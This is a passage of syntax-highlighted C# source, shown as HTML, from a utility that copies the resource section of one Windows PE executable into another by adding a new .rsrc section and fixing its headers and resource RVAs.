            </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc9">#if DEBUGCONSOLE
</span><span class="sc0">                </span><span class="sc11">Console</span><span class="sc10">.</span><span class="sc11">WriteLine</span><span class="sc10">(</span><span class="sc6">"Cannot open file"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc9">#endif
</span><span class="sc0">                </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc5">false</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc11">BinaryWriter</span><span class="sc0"> </span><span class="sc11">outWriter</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">BinaryWriter</span><span class="sc10">(</span><span class="sc11">outStream</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">BinaryReader</span><span class="sc0"> </span><span class="sc11">outReader</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">BinaryReader</span><span class="sc10">(</span><span class="sc11">outStream</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">BinaryReader</span><span class="sc0"> </span><span class="sc11">inReader</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">BinaryReader</span><span class="sc10">(</span><span class="sc11">inStream</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">MSDOSHeader</span><span class="sc0"> </span><span class="sc11">inmsdosheader</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">MSDOSHeader</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc11">inmsdosheader</span><span class="sc10">.</span><span class="sc11">Read</span><span class="sc10">(</span><span class="sc11">inReader</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">PEHeader</span><span class="sc0"> </span><span class="sc11">inpeheader</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">PEHeader</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc11">inpeheader</span><span class="sc10">.</span><span class="sc11">Read</span><span class="sc10">(</span><span class="sc11">inReader</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">inmsdosheader</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc16">byte</span><span class="sc0"> </span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">resSection</span><span class="sc10">=</span><span class="sc11">inpeheader</span><span class="sc10">.</span><span class="sc11">GetResourceSection</span><span class="sc10">(</span><span class="sc11">inReader</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">resSection</span><span class="sc10">==</span><span class="sc5">null</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc9">#if DEBUGCONSOLE
</span><span class="sc0">                </span><span class="sc11">Console</span><span class="sc10">.</span><span class="sc11">WriteLine</span><span class="sc10">(</span><span class="sc6">"No resources in source"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc9">#endif
</span><span class="sc0">                </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc5">false</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc11">MSDOSHeader</span><span class="sc0"> </span><span class="sc11">outmsdosheader</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">MSDOSHeader</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc11">outmsdosheader</span><span class="sc10">.</span><span class="sc11">Read</span><span class="sc10">(</span><span class="sc11">outReader</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">PEWriter</span><span class="sc0"> </span><span class="sc11">outpewriter</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">PEWriter</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc11">outpewriter</span><span class="sc10">.</span><span class="sc11">Read</span><span class="sc10">(</span><span class="sc11">outReader</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">outmsdosheader</span><span class="sc10">);</span><span class="sc0">
            
            </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc5">null</span><span class="sc10">!=</span><span class="sc11">outpewriter</span><span class="sc10">.</span><span class="sc11">GetResourceSection</span><span class="sc10">(</span><span class="sc11">outReader</span><span class="sc10">))</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc9">#if DEBUGCONSOLE
</span><span class="sc0">                </span><span class="sc11">Console</span><span class="sc10">.</span><span class="sc11">WriteLine</span><span class="sc10">(</span><span class="sc6">"Already resources in destination"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc9">#endif
</span><span class="sc0">                </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc5">false</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc2">// exit if rsrc already exists in output file
</span><span class="sc0">            </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc11">SectionHeader</span><span class="sc0"> </span><span class="sc11">lastsection</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">SectionHeader</span><span class="sc10">)</span><span class="sc0">
                </span><span class="sc11">outpewriter</span><span class="sc10">.</span><span class="sc11">sectionHeaders</span><span class="sc10">[</span><span class="sc11">outpewriter</span><span class="sc10">.</span><span class="sc11">sectionHeaders</span><span class="sc10">.</span><span class="sc11">Count</span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">];</span><span class="sc0">
            </span><span class="sc2">// phys offset of new section aligned to file alignment
</span><span class="sc0">            </span><span class="sc16">uint</span><span class="sc0"> </span><span class="sc11">physOffset</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">lastsection</span><span class="sc10">.</span><span class="sc11">pointerToRawData</span><span class="sc10">+</span><span class="sc11">lastsection</span><span class="sc10">.</span><span class="sc11">sizeOfRawData</span><span class="sc10">+</span><span class="sc4">1</span><span class="sc10">)/</span><span class="sc0">
                </span><span class="sc11">outpewriter</span><span class="sc10">.</span><span class="sc11">fileAlignment</span><span class="sc10">)*(</span><span class="sc11">outpewriter</span><span class="sc10">.</span><span class="sc11">fileAlignment</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc16">uint</span><span class="sc0"> </span><span class="sc11">physSize</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(((</span><span class="sc16">uint</span><span class="sc10">)</span><span class="sc11">resSection</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc10">)/</span><span class="sc11">outpewriter</span><span class="sc10">.</span><span class="sc11">fileAlignment</span><span class="sc10">+</span><span class="sc4">1</span><span class="sc10">)*</span><span class="sc0">
                </span><span class="sc10">(</span><span class="sc11">outpewriter</span><span class="sc10">.</span><span class="sc11">fileAlignment</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc16">uint</span><span class="sc0"> </span><span class="sc11">virtAddr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">outpewriter</span><span class="sc10">.</span><span class="sc11">imageSize</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc16">uint</span><span class="sc0"> </span><span class="sc11">newImageSize</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">outpewriter</span><span class="sc10">.</span><span class="sc11">imageSize</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> 
                </span><span class="sc10">(((</span><span class="sc16">uint</span><span class="sc10">)</span><span class="sc11">resSection</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc10">)/</span><span class="sc11">outpewriter</span><span class="sc10">.</span><span class="sc11">sectionAlignment</span><span class="sc10">+</span><span class="sc4">1</span><span class="sc10">)*</span><span class="sc0">
                </span><span class="sc10">(</span><span class="sc11">outpewriter</span><span class="sc10">.</span><span class="sc11">sectionAlignment</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">SectionHeader</span><span class="sc0"> </span><span class="sc11">newsect</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">SectionHeader</span><span class="sc10">(</span><span class="sc6">".rsrc"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">uint</span><span class="sc10">)</span><span class="sc11">resSection</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc10">,</span><span class="sc0">
                </span><span class="sc11">virtAddr</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">physSize</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">physOffset</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0x42000040</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">Dictionary</span><span class="sc0"> </span><span class="sc11">d</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">Dictionary</span><span class="sc10">(</span><span class="sc11">virtAddr</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">uint</span><span class="sc10">)</span><span class="sc11">resSection</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc2">// write section
</span><span class="sc0">            </span><span class="sc11">outWriter</span><span class="sc10">.</span><span class="sc11">BaseStream</span><span class="sc10">.</span><span class="sc11">Position</span><span class="sc10">=</span><span class="sc11">physOffset</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">outWriter</span><span class="sc10">.</span><span class="sc11">Write</span><span class="sc10">(</span><span class="sc11">resSection</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">resSection</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc5">for</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">&lt;(</span><span class="sc11">outpewriter</span><span class="sc10">.</span><span class="sc11">fileAlignment</span><span class="sc10">-</span><span class="sc0">
                </span><span class="sc11">resSection</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc10">%</span><span class="sc11">outpewriter</span><span class="sc10">.</span><span class="sc11">fileAlignment</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0">
                </span><span class="sc11">outWriter</span><span class="sc10">.</span><span class="sc11">Write</span><span class="sc10">((</span><span class="sc16">byte</span><span class="sc10">)</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc2">// modify pe header
</span><span class="sc0">            </span><span class="sc11">outpewriter</span><span class="sc10">.</span><span class="sc11">AddSectionHeader</span><span class="sc10">(</span><span class="sc11">newsect</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">outReader</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">outWriter</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">outmsdosheader</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">outpewriter</span><span class="sc10">.</span><span class="sc11">WriteResourcesDictionary</span><span class="sc10">(</span><span class="sc11">d</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">outWriter</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">outmsdosheader</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">outpewriter</span><span class="sc10">.</span><span class="sc11">SetImageSize</span><span class="sc10">(</span><span class="sc11">newImageSize</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">outWriter</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">outmsdosheader</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc2">// fix RVAs in resource section
</span><span class="sc0">            </span><span class="sc11">outWriter</span><span class="sc10">.</span><span class="sc11">Flush</span><span class="sc10">();</span><span class="sc0"> </span><span class="sc11">outReader</span><span class="sc10">.</span><span class="sc11">Close</span><span class="sc10">();</span><span class="sc0"> </span><span class="sc11">outWriter</span><span class="sc10">.</span><span class="sc11">Close</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc11">outStream</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">FileStream</span><span class="sc10">(</span><span class="sc11">outFileName</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FileMode</span><span class="sc10">.</span><span class="sc11">Open</span><span class="sc10">,</span><span class="sc0">
                </span><span class="sc11">FileAccess</span><span class="sc10">.</span><span class="sc11">ReadWrite</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">outReader</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">BinaryReader</span><span class="sc10">(</span><span class="sc11">outStream</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">outWriter</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">BinaryWriter</span><span class="sc10">(</span><span class="sc11">outStream</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">outpewriter</span><span class="sc10">.</span><span class="sc11">FixResources</span><span class="sc10">(</span><span class="sc11">physOffset</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">inpeheader</span><span class="sc10">.</span><span class="sc11">resourceTable</span><span class="sc10">.</span><span class="sc11">rva</span><span class="sc10">,</span><span class="sc0"> 
                </span><span class="sc11">virtAddr</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">outReader</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">outWriter</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">outWriter</span><span class="sc10">.</span><span class="sc11">Flush</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc11">inReader</span><span class="sc10">.</span><span class="sc11">Close</span><span class="sc10">();</span><span class="sc0"> </span><span class="sc11">outReader</span><span class="sc10">.</span><span class="sc11">Close</span><span class="sc10">();</span><span class="sc0"> </span><span class="sc11">outWriter</span><span class="sc10">.</span><span class="sc11">Close</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc11">inStream</span><span class="sc10">.</span><span class="sc11">Close</span><span class="sc10">();</span><span class="sc0"> </span><span class="sc11">outStream</span><span class="sc10">.</span><span class="sc11">Close</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc5">true</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc5">sealed</span><span class="sc0"> </span><span class="sc16">class</span><span class="sc0"> </span><span class="sc11">AssemblyProvider</span><span class="sc0"> </span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">IAssemblyProvider</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc11">Assembly</span><span class="sc0"> </span><span class="sc11">Load</span><span class="sc10">(</span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">assemblyName</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">Assembly</span><span class="sc10">.</span><span class="sc11">Load</span><span class="sc10">(</span><span class="sc11">assemblyName</span><span class="sc10">);</span><span class="sc0"> 
            </span><span class="sc10">}</span><span class="sc0">
            
            </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc11">Assembly</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">GetAssemblies</span><span class="sc10">()</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc5">throw</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">NotImplementedException</span><span class="sc10">();</span><span class="sc0">    
            </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc16">class</span><span class="sc0"> </span><span class="sc11">MSDOSHeader</span><span class="sc0"> 
        </span><span class="sc10">{</span><span class="sc0">

            </span><span class="sc5">protected</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">lfanew</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">protected</span><span class="sc0"> </span><span class="sc16">byte</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">buffer</span><span class="sc10">=</span><span class="sc5">new</span><span class="sc0"> </span><span class="sc16">byte</span><span class="sc10">[</span><span class="sc4">128</span><span class="sc10">];</span><span class="sc0">      

            </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">Lfanew</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc11">get</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">lfanew</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0"> 
   
            </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">Read</span><span class="sc10">(</span><span class="sc11">BinaryReader</span><span class="sc0"> </span><span class="sc11">source</span><span class="sc10">)</span><span class="sc0"> 
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">source</span><span class="sc10">.</span><span class="sc11">Read</span><span class="sc10">(</span><span class="sc11">buffer</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">buffer</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">lfanew</span><span class="sc10">=((</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">buffer</span><span class="sc10">[</span><span class="sc4">0x3c</span><span class="sc10">]&lt;&lt;</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">buffer</span><span class="sc10">[</span><span class="sc4">0x3c</span><span class="sc10">+</span><span class="sc4">1</span><span class="sc10">]&lt;&lt;</span><span class="sc4">8</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0">
                    </span><span class="sc10">((</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">buffer</span><span class="sc10">[</span><span class="sc4">0x3c</span><span class="sc10">+</span><span class="sc4">2</span><span class="sc10">]&lt;&lt;</span><span class="sc4">16</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">buffer</span><span class="sc10">[</span><span class="sc4">0x3c</span><span class="sc10">+</span><span class="sc4">3</span><span class="sc10">]&lt;&lt;</span><span class="sc4">24</span><span class="sc10">);</span><span class="sc0"> 
            </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc16">class</span><span class="sc0"> </span><span class="sc11">PEWriter</span><span class="sc0"> </span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">PEHeader</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">WriteResourcesDictionary</span><span class="sc10">(</span><span class="sc11">Dictionary</span><span class="sc0"> </span><span class="sc11">d</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">BinaryWriter</span><span class="sc0"> </span><span class="sc11">dest</span><span class="sc10">,</span><span class="sc0"> 
                </span><span class="sc11">MSDOSHeader</span><span class="sc0"> </span><span class="sc11">msdosheader</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">dest</span><span class="sc10">.</span><span class="sc11">BaseStream</span><span class="sc10">.</span><span class="sc11">Position</span><span class="sc10">=</span><span class="sc11">msdosheader</span><span class="sc10">.</span><span class="sc11">Lfanew</span><span class="sc10">+</span><span class="sc4">0x88</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc11">dest</span><span class="sc10">.</span><span class="sc11">Write</span><span class="sc10">(</span><span class="sc11">d</span><span class="sc10">.</span><span class="sc11">rva</span><span class="sc10">);</span><span class="sc0">  </span><span class="sc11">dest</span><span class="sc10">.</span><span class="sc11">Write</span><span class="sc10">(</span><span class="sc11">d</span><span class="sc10">.</span><span class="sc11">size</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">AddSectionHeader</span><span class="sc10">(</span><span class="sc11">SectionHeader</span><span class="sc0"> </span><span class="sc11">sh</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">BinaryReader</span><span class="sc0"> </span><span class="sc11">source</span><span class="sc10">,</span><span class="sc0"> 
                </span><span class="sc11">BinaryWriter</span><span class="sc0"> </span><span class="sc11">dest</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MSDOSHeader</span><span class="sc0"> </span><span class="sc11">msdosheader</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc2">//msdosheader.Lfanew = - 
</span><span class="sc0">                </span><span class="sc11">source</span><span class="sc10">.</span><span class="sc11">BaseStream</span><span class="sc10">.</span><span class="sc11">Position</span><span class="sc10">=</span><span class="sc11">msdosheader</span><span class="sc10">.</span><span class="sc11">Lfanew</span><span class="sc10">+</span><span class="sc4">0x06</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc16">ushort</span><span class="sc0"> </span><span class="sc11">sections</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">source</span><span class="sc10">.</span><span class="sc11">ReadUInt16</span><span class="sc10">();</span><span class="sc0">
                </span><span class="sc11">dest</span><span class="sc10">.</span><span class="sc11">BaseStream</span><span class="sc10">.</span><span class="sc11">Position</span><span class="sc10">=</span><span class="sc11">msdosheader</span><span class="sc10">.</span><span class="sc11">Lfanew</span><span class="sc10">+</span><span class="sc4">0x06</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc11">dest</span><span class="sc10">.</span><span class="sc11">Write</span><span class="sc10">(</span><span class="sc11">sections</span><span class="sc10">+</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">dest</span><span class="sc10">.</span><span class="sc11">BaseStream</span><span class="sc10">.</span><span class="sc11">Position</span><span class="sc10">=</span><span class="sc11">msdosheader</span><span class="sc10">.</span><span class="sc11">Lfanew</span><span class="sc10">+</span><span class="sc4">0xf8</span><span class="sc10">+</span><span class="sc11">sections</span><span class="sc10">*</span><span class="sc4">0x28</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc11">sh</span><span class="sc10">.</span><span class="sc11">Write</span><span class="sc10">(</span><span class="sc11">dest</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">SetImageSize</span><span class="sc10">(</span><span class="sc16">uint</span><span class="sc0"> </span><span class="sc11">isize</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">BinaryWriter</span><span class="sc0"> </span><span class="sc11">dest</span><span class="sc10">,</span><span class="sc0"> 
                </span><span class="sc11">MSDOSHeader</span><span class="sc0"> </span><span class="sc11">msdosheader</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">dest</span><span class="sc10">.</span><span class="sc11">BaseStream</span><span class="sc10">.</span><span class="sc11">Position</span><span class="sc10">=</span><span class="sc11">msdosheader</span><span class="sc10">.</span><span class="sc11">Lfanew</span><span class="sc10">+</span><span class="sc4">0x50</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc11">dest</span><span class="sc10">.</span><span class="sc11">Write</span><span class="sc10">(</span><span class="sc11">isize</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">FixResources</span><span class="sc10">(</span><span class="sc16">uint</span><span class="sc0"> </span><span class="sc11">resOffset</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">uint</span><span class="sc0"> </span><span class="sc11">oldResRVA</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">uint</span><span class="sc0"> </span><span class="sc11">newResRVA</span><span class="sc10">,</span><span class="sc0">
                </span><span class="sc11">BinaryReader</span><span class="sc0"> </span><span class="sc11">src</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">BinaryWriter</span><span class="sc0"> </span><span class="sc11">dest</span><span class="sc10">)</span><span class="sc0"> 
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">ReadNode</span><span class="sc10">(</span><span class="sc11">resOffset</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">oldResRVA</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">newResRVA</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">src</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">dest</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">ReadNode</span><span class="sc10">(</span><span class="sc16">uint</span><span class="sc0"> </span><span class="sc11">resOffset</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">uint</span><span class="sc0"> </span><span class="sc11">nodeOffset</span><span class="sc10">,</span><span class="sc0">
                </span><span class="sc16">uint</span><span class="sc0"> </span><span class="sc11">oldResRVA</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">uint</span><span class="sc0"> </span><span class="sc11">newResRVA</span><span class="sc10">,</span><span class="sc0">
                </span><span class="sc11">BinaryReader</span><span class="sc0"> </span><span class="sc11">src</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">BinaryWriter</span><span class="sc0"> </span><span class="sc11">dest</span><span class="sc10">)</span><span class="sc0"> 
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">src</span><span class="sc10">.</span><span class="sc11">BaseStream</span><span class="sc10">.</span><span class="sc11">Position</span><span class="sc10">=</span><span class="sc11">resOffset</span><span class="sc10">+</span><span class="sc11">nodeOffset</span><span class="sc10">+</span><span class="sc4">0x0c</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc16">ushort</span><span class="sc0"> </span><span class="sc11">numDesc</span><span class="sc10">=</span><span class="sc11">src</span><span class="sc10">.</span><span class="sc11">ReadUInt16</span><span class="sc10">();</span><span class="sc0">
                </span><span class="sc11">numDesc</span><span class="sc10">+=</span><span class="sc11">src</span><span class="sc10">.</span><span class="sc11">ReadUInt16</span><span class="sc10">();</span><span class="sc0">  </span><span class="sc2">// number of descendants
</span><span class="sc0">                </span><span class="sc5">for</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">&lt;</span><span class="sc11">numDesc</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0">
                </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc11">src</span><span class="sc10">.</span><span class="sc11">ReadUInt32</span><span class="sc10">();</span><span class="sc0">
                    </span><span class="sc16">uint</span><span class="sc0"> </span><span class="sc11">x</span><span class="sc10">=</span><span class="sc11">src</span><span class="sc10">.</span><span class="sc11">ReadUInt32</span><span class="sc10">();</span><span class="sc0">
                    </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc11">pos</span><span class="sc10">=</span><span class="sc11">src</span><span class="sc10">.</span><span class="sc11">BaseStream</span><span class="sc10">.</span><span class="sc11">Position</span><span class="sc10">;</span><span class="sc0">
                    </span><span class="sc5">if</span><span class="sc10">((</span><span class="sc11">x</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc4">0x80000000</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> 
                        </span><span class="sc2">// major bit set - node
</span><span class="sc0">                        </span><span class="sc2">// recursion
</span><span class="sc0">                        </span><span class="sc11">ReadNode</span><span class="sc10">(</span><span class="sc11">resOffset</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">x</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc4">0x7fffffff</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">oldResRVA</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">newResRVA</span><span class="sc10">,</span><span class="sc0"> 
                            </span><span class="sc11">src</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">dest</span><span class="sc10">);</span><span class="sc0"> 
